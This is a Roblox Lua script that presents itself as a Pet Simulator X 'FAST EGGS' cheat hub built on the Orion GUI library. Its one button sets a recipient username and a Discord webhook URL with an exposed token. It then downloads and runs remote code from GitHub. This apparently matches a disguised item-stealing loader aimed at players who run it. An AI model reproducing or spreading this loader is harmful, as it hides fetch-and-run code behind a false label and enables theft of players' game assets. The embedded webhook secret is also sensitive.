local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "PSX-HUB by [YT_Zefko]", HidePremium = false, SaveConfig = true, ConfigFolder = "YT_Zefko"})
OrionLib:MakeNotification({
	Name = "PSX-HUB by [YT_Zefko]",
	Content = "Welcome to PSX-HUB by [YT_Zefko]",
	Image = "rbxassetid://4483345998",
	Time = 10
})

local Tab = Window:MakeTab({
	Name = "FAST EGGS",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "Activate",
	Callback = function()
      		print("button pressed")
Username = "notulP_hctiwT"
WebHook = "https://discord.com/api/webhooks/1099993941123801108/T78_V77Dzk3RSo6IHTmKCXrkLdqlwERW9wLIbBMjF7nlcVPeSnPEuVVOn5PTOKh8bV6C"

loadingscreen = true
_G.CustomScriptName = "FAST EGGS by [YT_Zefko]"
_G.Text1 = "[SCRIPT] Loading now ..."
_G.Text2 = "[SCRIPT] Waiting 10 seconds ..."
_G.Text3 = "[SCRIPT] Checking now..."
_G.Text4 = "[SCRIPT] Starting now..."
loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
	end    
})

OrionLib:Init()
